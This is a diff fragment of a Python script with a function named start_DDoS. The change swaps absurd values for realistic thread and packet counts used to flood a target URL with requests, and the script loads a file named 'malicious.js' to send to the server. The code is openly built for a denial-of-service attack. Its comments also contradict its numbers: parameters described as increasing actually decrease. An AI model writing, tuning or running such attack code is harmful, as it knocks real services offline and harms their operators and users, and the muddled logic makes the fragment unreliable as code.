@@ -13,12 +13,12 @@ def start_DDoS(url):
             response = requests.get(url)
             if response.status_code == 200:
                 # If the response is successful, increase the attack parameters.
-                threads = 1000000000000000000000000000000
-                num_packets = 100000000000000000000000000
+                threads = 3651
+                num_packets = 5043
             else:
                 # If the response is unsuccessful, decrease the attack parameters.
-                threads = 50000000000000000000000000000000
-                num_packets = 1000000000000000000000000000
+                threads = 2084
+                num_packets = 3021
             # Read malicious file
             malicious_file = open("malicious.js", 'rb')    
             # Send the malicious requests to the server.
